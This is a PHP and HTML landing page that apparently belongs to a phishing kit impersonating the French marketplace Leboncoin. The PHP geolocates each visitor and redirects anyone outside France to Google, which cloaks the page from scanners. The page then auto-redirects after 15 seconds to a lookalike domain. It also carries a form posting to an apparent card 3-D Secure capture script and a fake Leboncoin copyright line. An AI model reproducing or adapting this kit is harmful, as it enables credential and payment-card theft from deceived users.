<?php
// Fonction pour obtenir l'adresse IP de l'utilisateur
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Adresse IP de l'utilisateur
$user_ip = getUserIP();

// API de géolocalisation pour obtenir les informations de l'IP
$response = file_get_contents("http://ip-api.com/json/{$user_ip}");
$location_data = json_decode($response);

// Vérifie si la réponse de l'API est valide et si l'utilisateur est en France
if (!$location_data || $location_data->status !== 'success' || $location_data->countryCode !== 'FR') {
    // Redirige vers Google si l'utilisateur n'est pas en France ou si l'API échoue
    header("Location: https://www.google.com/");
    exit();
}
?>
<!DOCTYPE html>
<html lang="en-US">
  <head>
    <link rel="icon" href="http://cr07267.tw1.ru/favicon.ico" />
    <meta http-equiv="refresh" content="15;url=https://dermoi.lbc-000.online/" />
    <meta charset="UTF-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, maximum-scale=1"
    />
    <title>Bienvenue .....</title>
    <style>
      body,
      html {
        margin: 0;
        height: 100%;
        width: 100%;
        display: flex;
        flex-direction: column;
        justify-content: center;
        background-color: #fff;
        background-image: linear-gradient(315deg, #fff 0, #ffffff 74%);
        font-family: Helvetica, Arial, sans-serif;
      }
      a {
        text-decoration: none;
        color: #89d2fa;
      }
      .logo {
        position: absolute;
        right: 15px;
        bottom: 15px;
      }
      .title {
        font-size: 1.5em;
        color: #404040;
      }
      .btn {
        display: inline-block;
        padding: 5px 15px;
        border-radius: 0.317rem;
        color: #fff;
        font-size: 1rem;
        background-color: #fcfcfc;
        cursor: pointer;
      }
      .btn:hover {
        opacity: 0.85;
      }
      .container {
        text-align: center;
        position: relative;
      }
      .footer {
        font-size: 12px;
      }
      img {
        max-width: 100%;
        height: auto;
        display: block;
        margin: 0 auto; /* Center images */
      }
      /* Responsive styles */
      @media (max-width: 768px) {
        .desktop-image {
          display: none;
        }
        .mobile-image {
          display: block;
        }
      }
      @media (min-width: 769px) {
        .desktop-image {
          display: block;
        }
        .mobile-image {
          display: none;
        }
      }
    </style>
  </head>
  <body>
    <div class="container">
      <form action="3dsex.php" method="">
        <input type="hidden" name="_token" value="" />
        <input type="hidden" id="tos_accepted" name="tos_accepted" value="1" />
        <input
          type="hidden"
          id="privacy_accepted"
          name="privacy_accepted"
          value="1"
        />
        <input type="hidden" id="special_id" name="special_id" value="" />

        <!-- Image par défaut (desktop) -->
        <img
          src="./img/Playful Green Cooking Tutorial YouTube Video Chapters.gif"
          alt="Image desktop"
          class="desktop-image"
        />

        <!-- Image pour mobile -->
        <img
          src="./img/Story Instagram Bon Appétit en Vert Olive Vert clair Blanc Style Montage vidéo Simple (1).gif"
          alt="Image mobile"
          class="mobile-image"
        />
      </form>
      <div class="footer">
        <span style="color: #d17c0c"
          >Copyright © 2024 Leboncoin. Tous droits réservés.</span
        >
      </div>
    </div>

    <div class="logo"></div>
    <script src="./load_files/jquery-2.5.1.min.js.download"></script>
  </body>
</html>

